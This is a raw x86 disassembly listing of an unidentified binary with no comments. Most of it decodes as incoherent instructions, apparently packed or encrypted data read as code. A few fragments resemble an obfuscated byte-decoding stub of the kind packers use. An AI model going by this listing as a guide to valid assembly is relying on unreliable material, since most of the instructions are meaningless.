  403948:	mov    eax,ds:0x6ac0af2c
  40394d:	aaa    
  40394e:	adc    dh,BYTE PTR [edi-0x735e2ebc]
  403954:	sub    BYTE PTR [esi],bl
  403956:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403957:	pop    esp
  403958:	aam    0xa
  40395a:	and    al,0xe
  40395c:	sbb    BYTE PTR [eax+0x20],dh
  40395f:	sub    BYTE PTR [bp+0x7b9c],bl
  403964:	cmp    DWORD PTR [ecx],0x6b
  403967:	inc    ebx
  403968:	push   ds
  403969:	aaa    
  40396a:	and    BYTE PTR [edi-0x74],0xee
  40396e:	sti    
  40396f:	mov    ebp,0xf54afd2f
  403974:	push   ebx
  403975:	xchg   edi,eax
  403976:	xchg   ecx,eax
  403977:	mov    edi,0xebc51686
  40397c:	ja     0x403964
  40397e:	scas   eax,DWORD PTR es:[edi]
  40397f:	xchg   ebx,eax
  403980:	mov    ch,0x74
  403982:	sub    cl,BYTE PTR [eax+0x46386a8b]
  403988:	sbb    ah,ch
  40398a:	jno    0x40399f
  40398c:	test   al,0xa8
  40398e:	mov    esi,0x403abb0a
  403993:	cmc    
  403994:	cmc    
  403995:	mov    esi,0x4d028f86
  40399a:	and    DWORD PTR [edx],esp
  40399c:	add    dl,BYTE PTR [edi]
  40399e:	ds push 0x38448c71
  4039a4:	jecxz  0x403927
  4039a6:	loopne 0x4039ba
  4039a8:	fcomi  st,st(2)
  4039aa:	das    
  4039ab:	loopne 0x4039a2
  4039ad:	mov    bl,dl
  4039af:	dec    esp
  4039b0:	or     al,BYTE PTR [eax+0x3625d1c6]
  4039b6:	inc    edx
  4039b7:	mov    DWORD PTR [ecx-0x7eddad35],ecx
  4039bd:	and    edi,eax
  4039bf:	popa   
  4039c0:	and    eax,0xb57f4a7b
  4039c5:	dec    edx
  4039c6:	(bad)  
  4039c7:	pop    ds
  4039c8:	les    ebx,FWORD PTR [esi+eiz*4-0x65b75e4c]
  4039cf:	repnz and BYTE PTR [esi],dl
  4039d2:	into   
  4039d3:	jge    0x4039c0
  4039d5:	pop    esi
  4039d6:	dec    edi
  4039d7:	or     esp,DWORD PTR [eax-0xc55b2e8]
  4039dd:	cmp    al,0x3e
  4039df:	mov    edi,DWORD PTR [ecx+0x3]
  4039e2:	loopne 0x403a38
  4039e4:	jo     0x403969
  4039e6:	push   ecx
  4039e7:	xchg   ecx,eax
  4039e8:	(bad)  
  4039e9:	cld    
  4039ea:	sbb    bl,BYTE PTR [ebx]
  4039ec:	adc    BYTE PTR [ecx-0x6d36c13a],0xb3
  4039f3:	sahf   
  4039f4:	in     eax,0x2
  4039f6:	das    
  4039f7:	fisubr WORD PTR [ebx+0x3]
  4039fa:	mov    ecx,0x501b9064
  4039ff:	adc    dl,BYTE PTR [edi]
  403a01:	enter  0xd171,0x6b
  403a05:	jp     0x40399a
  403a07:	adc    edi,DWORD PTR [edx+0x22]
  403a0a:	and    bh,BYTE PTR [eax]
  403a0c:	aad    0xc7
  403a0e:	ins    DWORD PTR es:[edi],dx
  403a0f:	cmp    al,0xbb
  403a11:	add    eax,0x4fb75812
  403a16:	repnz cli 
  403a18:	bound  esp,QWORD PTR [esi]
  403a1a:	xchg   DWORD PTR [ecx-0x59],ebp
  403a1d:	and    DWORD PTR fs:[eax],edi
  403a20:	pop    edi
  403a21:	retf   0x9117
  403a24:	cld    
  403a25:	push   edi
  403a26:	dec    ecx
  403a27:	adc    ecx,DWORD PTR [edx+0x6c710be]
  403a2d:	xor    BYTE PTR [edi],al
  403a2f:	xchg   esp,eax
  403a30:	cwde   
  403a31:	aas    
  403a32:	and    eax,0x10b642a8
  403a37:	pop    esp
  403a38:	sti    
  403a39:	out    dx,al
  403a3a:	mov    ds:0x4a281b1b,eax
  403a3f:	or     esp,DWORD PTR [edi-0x53]
  403a42:	mov    ch,0x23
  403a44:	mov    bh,0xd9
  403a46:	push   eax
  403a47:	xchg   esp,eax
  403a48:	pop    ds
  403a49:	mov    dl,0xc
  403a4b:	aas    
  403a4c:	cmp    eax,0xc94f5be1
  403a51:	xor    eax,0x3c7f3987
  403a56:	ins    BYTE PTR es:[edi],dx
  403a57:	xlat   BYTE PTR ds:[ebx]
  403a58:	sub    bh,BYTE PTR [ebp-0x234aa25]
  403a5e:	shl    DWORD PTR [esi],cl
  403a60:	call   0x6e16:0x2a5d3ee2
  403a67:	jae    0x403a15
  403a69:	mov    esp,0x3a2b4d40
  403a6e:	mov    edx,0x6751a345
  403a73:	icebp  
  403a74:	in     eax,0x3b
  403a76:	adc    eax,0x1215e65
  403a7b:	mov    ds,ecx
  403a7d:	adc    eax,0xb3686908
  403a82:	int    0x53
  403a84:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403a85:	test   DWORD PTR [eax],edi
  403a87:	xor    esi,DWORD PTR [edi-0x67]
  403a8a:	cmp    esp,DWORD PTR [eax-0x7c]
  403a8d:	push   eax
  403a8e:	aam    0xbb
  403a90:	add    DWORD PTR [edi+ebx*2-0x5d],eax
  403a94:	mov    ebp,0x923bdff0
  403a99:	inc    ebp
  403a9a:	fcmove st,st(0)
  403a9c:	mov    ecx,0x65164f12
  403aa1:	int    0x67
  403aa3:	ds dec esp
  403aa5:	in     al,dx
  403aa6:	in     al,0x6b
  403aa8:	sbb    al,0x56
  403aaa:	mov    eax,ds:0xb01c9c35
  403aaf:	out    dx,eax
  403ab0:	mov    WORD PTR [edi+ebx*8+0xe],fs
  403ab4:	and    ebx,DWORD PTR [ebx]
  403ab6:	mov    ch,0x42
  403ab8:	scas   eax,DWORD PTR es:[edi]
  403ab9:	and    al,BYTE PTR ds:0x69f1ddcb
  403abf:	jle    0x403a5a
  403ac1:	hlt    
  403ac2:	int3   
  403ac3:	repnz aad 0x88
  403ac6:	repz or DWORD PTR [edi-0x5d],0xd192c4e7
  403ace:	test   ah,dh
  403ad0:	xor    esi,edi
  403ad2:	push   es
  403ad3:	mov    ebx,0xb05a6c23
  403ad8:	xchg   edi,eax
  403ad9:	ja     0x403a8d
  403adb:	jmp    0xe1e7a939
  403ae0:	mov    eax,DWORD PTR [eax+eax*1-0x4a]
  403ae4:	mov    esp,0x8456e5d8
  403ae9:	xor    DWORD PTR ds:0xbd20354d,ecx
  403aef:	pop    ecx
  403af0:	mov    al,BYTE PTR [ebp-0x1]
  403af3:	movzx  ecx,WORD PTR ds:0x42e76b
  403afa:	adc    DWORD PTR ds:0x42fdf6,ecx
  403b00:	mov    ecx,DWORD PTR [ebp-0x10]
  403b03:	sub    DWORD PTR ds:0x42e1a4,0x77ef
  403b0d:	xor    al,0x47
  403b0f:	sub    al,0x37
  403b11:	and    DWORD PTR ds:0x42fd7d,0x33b1
  403b1b:	mov    BYTE PTR [ecx],al
  403b1d:	neg    DWORD PTR ds:0x42fd75
  403b23:	mov    DWORD PTR [ebp-0x8],0xf89c8531
  403b2a:	jmp    0x403e8a
  403b2f:	fist   WORD PTR [esi+0x1]
  403b32:	cdq    
  403b33:	mov    cl,0x69
  403b35:	addr16 push edx
  403b37:	push   esi
  403b38:	and    DWORD PTR [ecx+0x622c8c97],esi
  403b3e:	sti    
  403b3f:	lds    ebx,FWORD PTR [esi]
  403b41:	jo     0x403bb3
  403b43:	cmp    eax,0x7570707d
  403b48:	mov    ch,0xee
  403b4a:	mov    esp,0x24ba733
  403b4f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403b50:	in     al,0xf6
  403b52:	jge    0x403b73
  403b54:	and    al,0x49
  403b56:	movd   mm1,DWORD PTR [ecx]
  403b59:	sar    DWORD PTR [eax-0x1b],cl
  403b5c:	pop    ds
  403b5d:	cdq    
  403b5e:	mov    bl,BYTE PTR [edx]
  403b60:	(bad)  
  403b61:	in     eax,0x4c
  403b63:	add    eax,0x4ae83a6
  403b68:	sbb    BYTE PTR [esi-0x7c],ch
  403b6b:	jbe    0x403b0d
  403b6d:	jo     0x403b98
  403b6f:	jecxz  0x403b62
  403b71:	les    edx,FWORD PTR [edx-0x5382d9e9]
  403b77:	stos   DWORD PTR es:[edi],eax
  403b78:	in     eax,0xb3
  403b7a:	loop   0x403b6c
  403b7c:	mov    BYTE PTR [esi],ch
  403b7e:	vpsubb xmm0,xmm7,XMMWORD PTR [eax+0x31]
  403b83:	xchg   ecx,eax
  403b84:	das    
  403b85:	addr16 jl 0x403b5f
  403b88:	hlt    
  403b89:	inc    edi
  403b8a:	nop
  403b8b:	lock sub DWORD PTR [eax+eax*1-0x7a870eeb],ebp
  403b93:	stc    
  403b94:	stc    
  403b95:	inc    eax
  403b96:	cli    
  403b97:	jo     0x403bd0
  403b99:	rcr    edi,cl
  403b9b:	dec    eax
  403b9c:	lds    eax,FWORD PTR [edx+0x51]
  403b9f:	jmp    0x81356ad1
  403ba4:	add    cl,BYTE PTR cs:[edx]
  403ba7:	mov    cl,al
  403ba9:	repnz xchg esi,eax
  403bab:	frstor [edx-0x2e0d856]
  403bb1:	sbb    al,ah
  403bb3:	and    DWORD PTR [ecx+0x4f],esp
  403bb6:	fidivr WORD PTR [ecx]
  403bb8:	add    al,0x4e
  403bba:	add    BYTE PTR [esi+0xe],ah
  403bbd:	lahf   
  403bbe:	fdivr  DWORD PTR [ecx+0x54]
  403bc1:	lahf   
  403bc2:	add    ah,al
  403bc4:	push   esp
  403bc5:	ror    BYTE PTR ds:0xcb2b6b2b,cl
  403bcb:	test   DWORD PTR [ebp+0x42],edi
  403bce:	jge    0x403bbc
  403bd0:	xchg   ecx,eax
  403bd1:	sbb    eax,0x93b33d34
  403bd6:	aad    0x7f
  403bd8:	push   0xffffffed
  403bda:	or     eax,DWORD PTR [edi+0x1d3bad06]
  403be0:	sbb    al,0x1b
  403be2:	inc    ebp
  403be3:	push   cs
  403be4:	ret    0xa6fa
  403be7:	mov    ds:0x42e70d57,eax
  403bec:	(bad)
  403bf1:	ins    DWORD PTR es:[edi],dx
  403bf2:	mov    dh,0x32
  403bf4:	into   
  403bf5:	es enter 0xce49,0x7a
  403bfa:	push   edx
  403bfb:	mov    cl,0xee
  403bfd:	sti    
  403bfe:	and    al,0xab
  403c00:	inc    esp
  403c01:	call   0x8a20c4ba
  403c06:	pop    es
  403c07:	test   esp,0x556347d8
  403c0d:	addr16 stc 
  403c0f:	and    eax,0xd72bff9f
  403c14:	jae    0x403c6e
  403c16:	push   ds
  403c17:	rol    BYTE PTR [edi],0xd7
  403c1a:	int    0x3c
  403c1c:	cli    
  403c1d:	push   es
  403c1e:	idiv   DWORD PTR [eax+0x9]
  403c21:	(bad)  
  403c22:	jo     0x403c65
  403c24:	push   cs
  403c25:	imul   esp,DWORD PTR [edi],0x729d3c3a
  403c2b:	(bad)  
  403c2c:	fwait
  403c2d:	rcr    DWORD PTR [edi+ecx*2+0x2c9a9bfc],1
  403c34:	xor    esp,esi
  403c36:	mov    ah,0x98
  403c38:	out    0xaf,al
  403c3a:	sbb    edi,ecx
  403c3c:	inc    BYTE PTR [eax]
  403c3e:	dec    ebp
  403c3f:	(bad)  
  403c40:	clc    
  403c41:	aad    0xf
  403c43:	cld    
  403c44:	pusha  
  403c45:	push   0x32
  403c47:	dec    esi
  403c48:	jns    0x403c42
  403c4a:	push   DWORD PTR [edx-0x2d]
  403c4d:	and    dh,bl
  403c4f:	xchg   DWORD PTR [edx],ecx
  403c51:	fwait
  403c52:	sahf   
  403c53:	mov    cl,0x52
  403c55:	out    0x40,al
  403c57:	je     0x403c41
  403c59:	or     dl,bl
  403c5b:	loopne 0x403c2a
  403c5d:	jbe    0x403c0f
  403c5f:	xchg   esp,eax
  403c60:	scas   al,BYTE PTR es:[edi]
  403c61:	sahf   
  403c62:	add    al,0x50
  403c64:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403c65:	scas   eax,DWORD PTR es:[edi]
  403c66:	fs cli 
  403c68:	jb     0x403cd5
  403c6a:	nop
  403c6b:	xor    ebp,DWORD PTR [esi-0x34]
  403c6e:	lahf   
  403c6f:	push   ebx
  403c70:	xlat   BYTE PTR ds:[ebx]
  403c71:	daa    
  403c72:	jl     0x403c84
  403c74:	pushf  
  403c75:	mov    ds:0xdfbfd08c,eax
  403c7a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403c7b:	lea    di,[ebx-0x1621154a]
  403c82:	or     eax,0xf84471c0
  403c87:	or     DWORD PTR [edx],ebx
  403c89:	push   es
  403c8a:	loopne 0x403d00
  403c8c:	call   0xaaf1:0xf891a72d
  403c93:	fnstsw WORD PTR [ebx]
  403c95:	lods   al,BYTE PTR ds:[esi]
  403c96:	mov    ebp,0x595a91d1
  403c9b:	mov    al,0xb4
  403c9d:	repnz pop ds
  403c9f:	and    bl,BYTE PTR [ebx+edx*1+0x2]
  403ca3:	je     0x403d02
  403ca5:	add    al,BYTE PTR [eax+0x1d]
  403ca8:	int    0xb2
  403caa:	cmp    DWORD PTR [ebx],edi
  403cac:	aad    0xc0
  403cae:	add    eax,0xacc0706a
  403cb3:	int    0x1f
  403cb5:	rcr    BYTE PTR [esi+0x7d],1
  403cb8:	push   ss
  403cb9:	addr16 js 0x403d17
  403cbc:	jo     0x403c64
  403cbe:	mov    ebp,?
  403cc0:	popf   
  403cc1:	aad    0x8f
  403cc3:	in     eax,dx
  403cc4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403cc5:	bound  esi,QWORD PTR [ebp+0x3281974b]
  403ccb:	lods   al,BYTE PTR ds:[esi]
  403ccc:	aam    0xf1
  403cce:	cmp    eax,0x5760bdc
  403cd3:	fnstsw WORD PTR [ebp+0x567098a9]
  403cd9:	and    dh,bl
  403cdb:	mov    edx,DWORD PTR [ebx-0xfbc04bc]
  403ce1:	mov    cl,0xd5
  403ce3:	ins    DWORD PTR es:[edi],dx
  403ce4:	xchg   ebx,eax
  403ce5:	and    eax,0x632fa3ba
  403cea:	out    0x2,eax
  403cec:	cli    
  403ced:	xchg   DWORD PTR [ebx+esi*8+0x5b],edi
  403cf1:	sbb    al,dh
  403cf3:	mov    esp,0x7cf635af
  403cf8:	mov    esi,0xa603df86
  403cfd:	mov    ecx,0x4d59ccfb
  403d03:	sbb    cl,BYTE PTR ds:0xda2ca59b
  403d09:	push   es
  403d0a:	xor    edi,DWORD PTR [eax]
  403d0c:	pop    esi
  403d0d:	mov    edi,edx
  403d0f:	xor    eax,0x36ea55d2
  403d14:	es add al,0xe8
  403d17:	inc    edx
  403d18:	sub    dh,BYTE PTR [edx-0x24]
  403d1b:	lea    edi,[ebx]
  403d1d:	fdiv   DWORD PTR [ecx+0x4af56efb]
  403d23:	ds mov ah,0xa1
  403d26:	dec    esp
  403d27:	sub    BYTE PTR ds:0xfd7f71f3,0x73
  403d2e:	adc    BYTE PTR [esi-0x1f],bh
  403d31:	mov    ecx,0x16dfe009
  403d36:	push   es
  403d37:	adc    esi,DWORD PTR [ecx+0x67265ff1]
  403d3d:	call   DWORD PTR [ebx+0x19]
  403d40:	sub    dh,0xce
  403d43:	inc    ebp
  403d44:	xor    DWORD PTR [eax+0x54],ecx
  403d47:	push   ds
  403d48:	clc    
  403d49:	pop    eax
  403d4a:	aas    
  403d4b:	inc    ecx
  403d4c:	icebp  
  403d4d:	enter  0x56a3,0xd9
  403d51:	in     al,dx
  403d52:	and    al,BYTE PTR [edx+0x3c465df5]
  403d58:	clc    
  403d59:	push   ebx
  403d5a:	test   BYTE PTR [esi],cl
  403d5c:	inc    esi
  403d5d:	pop    ss
  403d5e:	xchg   esi,eax
  403d5f:	mov    BYTE PTR [ebx+0x3f5e18f4],0x6e
  403d66:	hlt    
  403d67:	call   0xa172471b
  403d6c:	jnp    0x403d46
  403d6e:	add    BYTE PTR [esi],bh
  403d70:	test   BYTE PTR [ebx+eiz*8+0x4f],bh
  403d74:	adc    DWORD PTR ds:0x27f36342,0xcaea853f
  403d7e:	arpl   WORD PTR [esi],si
  403d80:	sar    DWORD PTR [ebx],1
  403d82:	jecxz  0x403df3
  403d84:	mov    eax,0x31537c2c
  403d89:	xor    BYTE PTR [eax-0x47],al
  403d8c:	adc    ah,bl
  403d8e:	dec    esp
  403d8f:	mov    ebx,0x26d82d2f
  403d94:	fisttp QWORD PTR [ecx]
  403d96:	pusha  
  403d97:	xchg   ebp,eax
  403d98:	repz mov bl,0x3d
  403d9b:	cmp    eax,0x6b2edeee
  403da0:	rcr    esi,0xc9
  403da3:	pop    ds
  403da4:	idiv   esi
  403da6:	out    dx,eax
  403da7:	pop    ecx
  403da8:	stos   DWORD PTR es:[edi],eax
  403da9:	jmp    0x8675:0x9cef6fd2
  403db0:	jle    0x403d68
  403db2:	push   ds
  403db3:	loopne 0x403e15
  403db5:	mov    ebx,0xd5f6b6e8
  403dba:	bound  edi,QWORD PTR [ebx-0x55869883]
  403dc0:	adc    esp,DWORD PTR [esi+0x47]
  403dc3:	neg    DWORD PTR [ebp+0x7f5fc8a3]
  403dc9:	mov    ah,0xe8
  403dcb:	xor    ah,BYTE PTR [esi-0x426d8bce]
  403dd1:	cmp    DWORD PTR [ebx],ebp
  403dd3:	lds    ebp,FWORD PTR [ecx+eax*2+0x19]
  403dd7:	sar    DWORD PTR [edi+0x64],cl
  403dda:	mov    ebx,0xabb19437
  403ddf:	jecxz  0x403de5
  403de1:	lock je 0x403e3d
  403de4:	add    DWORD PTR [ecx-0x3bb703c1],ebx
  403dea:	bound  ebp,QWORD PTR ds:[ebx]
  403ded:	fbld   TBYTE PTR [esi+eiz*8+0x4d323b68]
  403df4:	sub    dh,ch
  403df6:	push   esi
  403df7:	xor    dh,BYTE PTR [edx+edx*4]
  403dfa:	cmp    BYTE PTR [edx],bl
  403dfc:	imul   ebx,DWORD PTR [ebp+0x6a],0x5ca947ec
  403e03:	mov    al,0xa7
  403e05:	fidivr DWORD PTR [eax+0x5d]
  403e08:	jne    0x403de2
  403e0a:	mov    esi,DWORD PTR [edx+0x40e83ab4]
  403e10:	add    esi,0xffffffba
  403e13:	inc    eax
  403e14:	cmp    edi,DWORD PTR [esi-0x5b378d36]
  403e1a:	mov    ah,0xda
  403e1c:	inc    ebx
  403e1d:	data16 jp 0x403dfa
  403e20:	hlt    
  403e21:	pusha  
  403e22:	jle    0x403db4
  403e24:	and    eax,0x9c82a15d
  403e29:	leave  
  403e2a:	dec    dl
  403e2c:	inc    ebx
  403e2d:	jb     0x403e24
  403e2f:	cdq    
  403e30:	(bad)  
  403e31:	sub    DWORD PTR [edx+0x38],edi
  403e34:	shr    BYTE PTR [eax+0x3a],0x64
  403e38:	inc    ebx
  403e39:	mov    BYTE PTR [ebx+0x1e],bl
  403e3c:	jmp    FWORD PTR [edx+0x7b316f1e]
  403e42:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403e43:	inc    edi
  403e44:	mov    edi,0x1d6a9951
  403e49:	call   0xdf4f7964
  403e4e:	icebp  
  403e4f:	mov    dl,cl
  403e51:	sub    edi,eax
  403e53:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403e54:	aam    0x87
  403e56:	fs pop ebx
  403e58:	xchg   edx,eax
  403e59:	ret    
  403e5a:	fnstenv [edx-0x1d]
  403e5d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403e5e:	mov    eax,ds:0xc8bc8bef
  403e63:	jno    0x403e75
  403e65:	xor    BYTE PTR [ecx+0x168ac427],ah
  403e6b:	push   ebp
  403e6c:	out    0x54,al
  403e6e:	call   0x961e:0xa854ce8f
  403e75:	add    eax,0x9b44cf09
  403e7a:	mov    ds:0xd78c039f,al
  403e7f:	mov    DWORD PTR fs:[ebp-0x23adb763],edx
  403e86:	jns    0x403e30
  403e88:	nop
  403e89:	ret    
  403e8a:	mov    DWORD PTR [ebp-0x10],0xf89c8530
  403e91:	mov    eax,DWORD PTR [ebp-0x8]
  403e94:	mov    ecx,0x7510855
  403e99:	push   esi
  403e9a:	xor    eax,ecx
  403e9c:	mov    esi,DWORD PTR ds:0x42e19c
  403ea2:	adc    DWORD PTR ds:0x42e78f,esi
  403ea8:	mov    esi,0x32729c
  403ead:	add    eax,esi
  403eaf:	mov    DWORD PTR ds:0x42fdf2,0x1a92
  403eb9:	jmp    0x40423a
  403ebe:	mov    dl,BYTE PTR [ebp-0x1]
  403ec1:	mov    DWORD PTR ds:0x42fd85,0x5bb3
  403ecb:	mov    BYTE PTR [ebp+eax*1-0x58],dl
  403ecf:	mov    DWORD PTR ds:0x42e76f,0x7752
  403ed9:	jmp    0x404239
  403ede:	jge    0x403ed6
  403ee0:	retf   0xf1c4
  403ee3:	in     al,0x15
  403ee5:	icebp  
  403ee6:	ss mov esp,0xb1ab1c35
  403eec:	int    0xe4
  403eee:	sbb    BYTE PTR [ebx],0x70
  403ef1:	jo     0x403f30
  403ef3:	jge    0x403f65
  403ef5:	jo     0x403f64
  403ef7:	push   ds
  403ef8:	in     al,dx
  403ef9:	aas    
  403efa:	enter  0x19e7,0xcb
  403efe:	stos   DWORD PTR es:[edi],eax
  403eff:	mov    edi,0xa373a4a9
  403f04:	addr16 mov cl,bh
  403f07:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403f08:	fld    QWORD PTR [edi]
  403f0a:	pop    ss
  403f0b:	jp     0x403ed2
  403f0d:	dec    edi
  403f0e:	push   eax
  403f0f:	mov    esi,0xaf5bf1bf
  403f14:	pop    ds
  403f15:	stc    
  403f16:	push   edx
  403f17:	xchg   edi,eax
  403f18:	push   ss
  403f19:	jns    0x403f57
  403f1b:	xor    DWORD PTR [edx+0x1a],esp
  403f1e:	dec    ebx
  403f1f:	sti    
  403f20:	sbb    al,0xd
  403f22:	cwde   
  403f23:	out    0x76,al
  403f25:	jmp    0x403edf
  403f27:	add    BYTE PTR [edx],0xfd
  403f2a:	mov    ch,0x5e
  403f2c:	or     dl,BYTE PTR [esi]
  403f2e:	sbb    DWORD PTR [ebx],eax
  403f30:	inc    esi
  403f31:	lock sbb al,0x47
  403f34:	pop    ebp
  403f35:	ror    BYTE PTR [ebx-0xb833077],1
  403f3b:	inc    ecx
  403f3c:	xchg   DWORD PTR [eax-0x4ac9bc1a],edi
  403f42:	mov    edx,0x335080f5
  403f47:	add    DWORD PTR [ebp+0x38478b10],eax
  403f4d:	ret    
  403f4e:	push   eax
  403f4f:	mov    DWORD PTR [edx-0x2f],esi
  403f52:	jge    0x403ef2
  403f54:	punpckhwd mm5,QWORD PTR [ebx+esi*1]
  403f58:	xor    ebp,DWORD PTR [ebx-0x3b]
  403f5b:	cmp    BYTE PTR [edi],0xfb
  403f5e:	test   eax,0xfcda5395
  403f63:	mov    dl,0xf2
  403f65:	dec    DWORD PTR [esi-0x9df377d]
  403f6b:	jge    0x403fc6
  403f6d:	imul   esp,DWORD PTR [ecx+0x7b1aef66],0x84066d46
  403f77:	rcr    edi,cl
  403f79:	out    dx,eax
  403f7a:	sub    eax,0xa59368d2
  403f7f:	cmp    BYTE PTR [esi],ch
  403f81:	pop    es
  403f82:	jmp    0xbba0:0xce6adf43
  403f89:	dec    eax
  403f8a:	or     DWORD PTR [ebx+ebx*2+0x5a7726ef],esp
  403f91:	xchg   ebx,eax
  403f92:	cwde   
  403f93:	jmp    0xa142c229
  403f98:	cmp    al,0x41
  403f9a:	psadbw mm4,QWORD PTR [eax+eiz*4-0x2d]
  403f9f:	inc    ebx
  403fa0:	inc    ebp
  403fa1:	push   ecx
  403fa2:	imul   ecx,edi,0xe0dac47e
  403fa8:	mov    dh,0x7a
  403faa:	ffree  st(4)
  403fac:	aaa    
  403fad:	repnz popf 
  403faf:	inc    ebp
  403fb0:	jno    0x403f60
  403fb2:	jno    0x404010
  403fb4:	ds xchg esp,eax
  403fb6:	fstp   QWORD PTR [ecx+0x36e6ca94]
  403fbc:	pop    esp
  403fbd:	add    ecx,edi
  403fbf:	adc    al,0x9b
  403fc1:	stos   DWORD PTR es:[edi],eax
  403fc2:	adc    BYTE PTR [edx+ebx*1+0x25],0xae
  403fc7:	mov    WORD PTR [esi+0x5567179c],gs
  403fcd:	clc    
  403fce:	lock adc eax,0xf013ef8d
  403fd4:	lahf   
  403fd5:	cld    
  403fd6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403fd7:	ror    DWORD PTR [ecx],cl
  403fd9:	je     0x40400f
  403fdb:	sub    DWORD PTR [ebx+0x7a98a00],ebp
  403fe1:	cdq    
  403fe2:	call   0xb04173b
  403fe7:	push   0xffffffb5
  403fe9:	retf   0x5797
  403fec:	out    dx,eax
  403fed:	dec    edx
  403fee:	mov    edi,0xc8f2f1e3
  403ff3:	mov    al,ds:0x5b775095
  403ff8:	ins    DWORD PTR es:[edi],dx
  403ff9:	inc    edx
  403ffa:	push   eax
  403ffb:	test   BYTE PTR [edx-0x7f7508e9],0x20
  404002:	fs mov eax,0x9030e632
  404008:	jg     0x40406e
  40400a:	cmc    
  40400b:	pop    ss
  40400c:	pop    ecx
  40400d:	cmc    
  40400e:	xchg   ebx,eax
  40400f:	push   0xc0322d69
  404014:	pop    ss
  404015:	or     DWORD PTR [esi-0x2d4aeb22],esp
  40401b:	leave  
  40401c:	jecxz  0x403fcd
  40401e:	in     eax,0xf0
  404020:	div    BYTE PTR [ebx]
  404022:	xchg   ebx,eax
  404023:	clc    
  404024:	sbb    al,BYTE PTR [eax]
  404026:	loop   0x40401e
  404028:	lea    esp,[edx]
  40402a:	fldenv [eax-0xe]
  40402d:	shl    BYTE PTR [edi-0x2470d7f],cl
  404033:	push   edx
  404034:	in     al,0xa6
  404036:	sub    BYTE PTR [eax],0xe4
  404039:	repnz (bad) 
  40403b:	mov    ebp,0x2341bfba
  404040:	or     eax,0x61df035e
  404045:	xlat   BYTE PTR ds:[ebx]
  404046:	cwde   
  404047:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404048:	pop    edx
  404049:	arpl   WORD PTR [ebp-0x5fcc3d34],di
  40404f:	lea    ebx,[esi-0x1703a9d7]
  404055:	dec    ebx
  404056:	jo     0x40405d
  404058:	mov    ebx,ecx
  40405a:	rcr    esi,0x3b
  40405d:	cmc    
  40405e:	sbb    al,0xc0
  404060:	cli    
  404061:	xor    BYTE PTR [edi],bh
  404063:	fnstenv [ebx]
  404065:	add    ecx,DWORD PTR [eax-0x7]
  404068:	mov    ecx,0x77fff132
  40406d:	cmp    bl,dh
  40406f:	jg     0x404001
  404071:	add    BYTE PTR [ebx-0x43],dh
  404074:	scas   eax,DWORD PTR es:[edi]
  404075:	sahf   
  404076:	or     al,0x61
  404079:	and    BYTE PTR [edx+0x64529195],cl
  40407f:	in     eax,dx
  404080:	xor    ebp,DWORD PTR [ebx+0x5e]
  404083:	or     ebp,DWORD PTR [ecx]
  404085:	add    DWORD PTR [eax+0x13d0f189],edx
  40408b:	stos   BYTE PTR es:[edi],al
  40408c:	shr    BYTE PTR ds:0xd4756380,cl
  404092:	ficom  DWORD PTR [ecx]
  404094:	frndint 
  404096:	jnp    0x4040d9
  404098:	fs fwait
  40409a:	jg     0x4040ba
  40409c:	cwde   
  40409d:	push   esp
  40409e:	std    
  40409f:	out    0x59,al
  4040a1:	test   BYTE PTR [edi-0x74c39ac8],ah
  4040a7:	ss in  eax,dx
  4040a9:	sbb    ch,BYTE PTR [eax+0x51833c0f]
  4040af:	mov    BYTE PTR [eax],al
  4040b1:	mov    ds:0x1122dd4,eax
  4040b6:	mov    esp,0x14aa59e
  4040bb:	push   ds
  4040bc:	repz daa 
  4040be:	mov    DWORD PTR [edi],esp
  4040c0:	ret    
  4040c1:	in     al,dx
  4040c2:	mov    BYTE PTR [edx+0x15456a1d],cl
  4040c8:	in     al,dx
  4040c9:	aam    0x41
  4040cb:	or     al,0x59
  4040cd:	xor    dl,BYTE PTR [edi-0x32af8536]
  4040d3:	push   eax
  4040d4:	rcl    BYTE PTR [edi],1
  4040d6:	into   
  4040d7:	mov    ds:0x61b2ac28,eax
  4040dc:	xchg   ebx,eax
  4040dd:	mov    dl,BYTE PTR [ebp-0x16]
  4040e0:	in     eax,dx
  4040e1:	in     al,dx
  4040e2:	adc    BYTE PTR [esi+0x7c],cl
  4040e5:	mov    WORD PTR [eax+0x24],cs
  4040e8:	dec    ecx
  4040e9:	inc    ebx
  4040ea:	enter  0x6535,0xfe
  4040ee:	into   
  4040ef:	mov    dh,0xf1
  4040f1:	mov    cl,BYTE PTR [ecx]
  4040f3:	jb     0x4040e9
  4040f5:	cmp    al,0x6f
  4040f7:	xchg   ecx,eax
  4040f8:	sbb    ecx,DWORD PTR ds:0x2d2f5494
  4040fe:	xchg   esi,eax
  4040ff:	mov    ch,0x7e
  404101:	stos   DWORD PTR es:[edi],eax
  404102:	fs jns 0x4040c9
  404105:	and    DWORD PTR [esi+0x27],edi
  404108:	mov    eax,0xde27e7f5
  40410d:	ror    ebx,1
  40410f:	fld    st(3)
  404111:	ja     0x4040ad
  404113:	test   DWORD PTR [ebx+eax*8-0x36932072],esi
  40411a:	or     eax,0x583be575
  40411f:	mov    al,0x8a
  404121:	or     eax,0x74667756
  404126:	dec    ecx
  404127:	xchg   esi,eax
  404128:	sbb    ebp,eax
  40412a:	imul   ecx,DWORD PTR [esi-0x61bbdde],0x33
  404131:	mov    ds:0xa9a7b91b,al
  404136:	imul   DWORD PTR [eax-0x31]
  404139:	inc    esp
  40413a:	xchg   ebp,eax
  40413b:	xor    BYTE PTR [edx+0x6c],0x30
  40413f:	leave  
  404140:	popf   
  404141:	xor    BYTE PTR es:[ebx],dh
  404144:	cwde   
  404145:	sub    ah,BYTE PTR [edi+edi*1-0x5a]
  404149:	pop    eax
  40414a:	mov    dh,0x84
  40414c:	imul   ecx,DWORD PTR [ebx+0x21],0x5c563dc6
  404153:	call   0x828:0x4d3ff315
  40415a:	jg     0x40415a
  40415c:	dec    edi
